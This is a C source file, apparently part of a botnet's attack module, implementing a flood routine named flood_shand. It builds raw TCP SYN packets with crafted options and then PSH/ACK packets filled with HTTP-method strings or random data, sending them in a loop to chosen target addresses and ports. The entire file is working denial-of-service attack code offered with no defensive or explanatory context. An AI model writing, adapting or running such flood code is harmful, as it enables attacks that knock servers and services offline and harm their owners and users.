#define _GNU_SOURCE

#ifdef DEBUG
#endif

#include "../../../../utils/headers/includes.h"
#include "../../../../utils/headers/util.h"
#include "../../../../utils/headers/resolver.h"
#include "../../attack.h"

void flood_shand(struct flood *flood)
{
    int i;
    int sfd;
    struct sockaddr_in dest;
    struct iphdr *iph;
    struct tcphdr *tcph;
    char buffer[MAX_PACKET_SIZE];
    uint8_t options_len = 0;
    
    // Attack parameters
    uint32_t target_ip = flood->targets[rand_next() % flood->num_of_targets].sock_addr.sin_addr.s_addr;
    uint16_t target_port = flood->settings->dest_port;
    if (target_port == 0xffff) target_port = rand_next() & 0xffff;

    // Local IP for checksums (not spoofing here as per original logic)
    uint32_t source_ip = LOCAL_ADDR;

    // HTTP patterns for payload
    char *http_patterns[] = {
        enc[HTTP_GET_LITERAL].string,
        enc[HTTP_POST_LITERAL].string,
        enc[HTTP_HEAD_LITERAL].string,
        enc[HTTP_OPTIONS_LITERAL].string,
        enc[HTTP_CONNECT_LITERAL].string,
        enc[HTTP_PUT_LITERAL].string,
        enc[HTTP_DELETE_LITERAL].string,
        enc[HTTP_PATCH_LITERAL].string
    };
    int pattern_count = 8;
    
    // Pre-generate some payloads or use custom one
    char payloads[10][1400];
    int payload_lens[10];
    
    int base_len = flood->settings->length;
    if (base_len <= 0) base_len = 512;
    if (base_len > 1400) base_len = 1400;

    for (i = 0; i < 10; i++) {
        int len = base_len;
        if (flood->settings->random_data && flood->settings->length == 0) {
            len = (rand_next() % 1300) + 100;
        }
        payload_lens[i] = len;

        if (flood->settings->payload != NULL) {
            int p_len = strlen(flood->settings->payload);
            if (p_len > len) p_len = len;
            memcpy(payloads[i], flood->settings->payload, p_len);
            if (p_len < len && flood->settings->random_data)
                rand_str(payloads[i] + p_len, len - p_len);
        } else if (rand_next() % 2) {
            char *pattern = http_patterns[rand_next() % pattern_count];
            int pattern_len = strlen(pattern);
            if (pattern_len > len) pattern_len = len;
            memcpy(payloads[i], pattern, pattern_len);
            if (pattern_len < len && flood->settings->random_data)
                rand_str(payloads[i] + pattern_len, len - pattern_len);
        } else {
            rand_str(payloads[i], len);
        }
    }

    if ((sfd = sys_socket(AF_INET, SOCK_RAW, IPPROTO_TCP)) == -1) {
        debug("Failed to create raw socket in shand\n");
        return;
    }

    int one = 1;
    if (sys_setsockopt(sfd, IPPROTO_IP, IP_HDRINCL, &one, sizeof(one)) == -1) {
        debug("Failed to set IP_HDRINCL in shand\n");
        sys_close(sfd);
        return;
    }

    sys_fcntl(sfd, F_SETFL, O_NONBLOCK);

    dest.sin_family = AF_INET;
    dest.sin_port = target_port;
    dest.sin_addr.s_addr = target_ip;

    while (*flood->running) {
        // SYN Packet
        memset(buffer, 0, MAX_PACKET_SIZE);
        iph = (struct iphdr *)buffer;
        tcph = (struct tcphdr *)(iph + 1);
        
        uint16_t source_port = (rand_next() % 64511) + 1024;
        uint32_t seq = rand_next();

        iph->version_ihl = (4 << 4) | 5;
        iph->tos = 0;
        iph->tot_len = htons(sizeof(struct iphdr) + sizeof(struct tcphdr) + 20); // +20 for options
        iph->id = htons(rand_next() % 65535);
        iph->frag_off = 0;
        iph->ttl = 64;
        iph->protocol = IPPROTO_TCP;
        iph->saddr = source_ip;
        iph->daddr = target_ip;
        iph->check = checksum_generic((uint16_t *)iph, sizeof(struct iphdr));

        tcph->source = htons(source_port);
        tcph->dest = htons(target_port);
        tcph->seq = htonl(seq);
        tcph->ack_seq = 0;
        tcph->doff = 10; // 5 (std) + 5 (options) = 10 * 4 = 40 bytes
        tcph->syn = 1;
        tcph->window = htons(65535);
        tcph->check = 0;
        
        // TCP Options (MSS, Window Scale, SACK Permitted, Timestamps)
        uint8_t *opts = (uint8_t *)(tcph + 1);
        opts[0] = 2; opts[1] = 4; opts[2] = 0x05; opts[3] = 0xB4; // MSS 1460
        opts[4] = 3; opts[5] = 3; opts[6] = 7; // Window scale 7
        opts[7] = 4; opts[8] = 2; // SACK permitted
        opts[9] = 8; opts[10] = 10; // Timestamps
        uint32_t ts = (uint32_t)sys_time(NULL);
        opts[11] = (ts >> 24) & 0xff; opts[12] = (ts >> 16) & 0xff; opts[13] = (ts >> 8) & 0xff; opts[14] = ts & 0xff;
        opts[15] = 0; opts[16] = 0; opts[17] = 0; opts[18] = 0;
        opts[19] = 1; // NOP padding

        tcph->check = checksum_tcpudp((uint8_t *)tcph, sizeof(struct tcphdr) + 20, (uint8_t *)&iph->saddr, (uint8_t *)&iph->daddr);

        sys_sendto(sfd, buffer, sizeof(struct iphdr) + sizeof(struct tcphdr) + 20, MSG_DONTWAIT, (void *)&dest, sizeof(dest));

        // Rapid PSH/ACK packets
        for (i = 0; i < 1; i++) {
            int p_idx = rand_next() % 10;
            int p_len = payload_lens[p_idx];

            memset(buffer, 0, MAX_PACKET_SIZE);
            iph = (struct iphdr *)buffer;
            tcph = (struct tcphdr *)(iph + 1);
            char *data = (char *)(tcph + 1);

            iph->version_ihl = (4 << 4) | 5;
            iph->tot_len = htons(sizeof(struct iphdr) + sizeof(struct tcphdr) + p_len);
            iph->id = htons(rand_next() % 65535);
            iph->ttl = 64;
            iph->protocol = IPPROTO_TCP;
            iph->saddr = source_ip;
            iph->daddr = target_ip;
            iph->check = checksum_generic((uint16_t *)iph, sizeof(struct iphdr));

            tcph->source = htons(source_port);
            tcph->dest = htons(target_port);
            tcph->seq = htonl(seq + 1 + (i * p_len));
            tcph->ack_seq = htonl(seq + 1);
            tcph->doff = 5;
            tcph->psh = 1;
            tcph->ack = 1;
            tcph->window = htons(65535);
            
            memcpy(data, payloads[p_idx], p_len);
            tcph->check = checksum_tcpudp((uint8_t *)tcph, sizeof(struct tcphdr) + p_len, (uint8_t *)&iph->saddr, (uint8_t *)&iph->daddr);

            sys_sendto(sfd, buffer, sizeof(struct iphdr) + sizeof(struct tcphdr) + p_len, MSG_DONTWAIT, (void *)&dest, sizeof(dest));
            if (flood->settings->sleep > 0)
                sys_usleep(flood->settings->sleep * 1000);
        }

        if (flood->settings->sleep > 0)
            sys_usleep(flood->settings->sleep * 1000);
    }
}
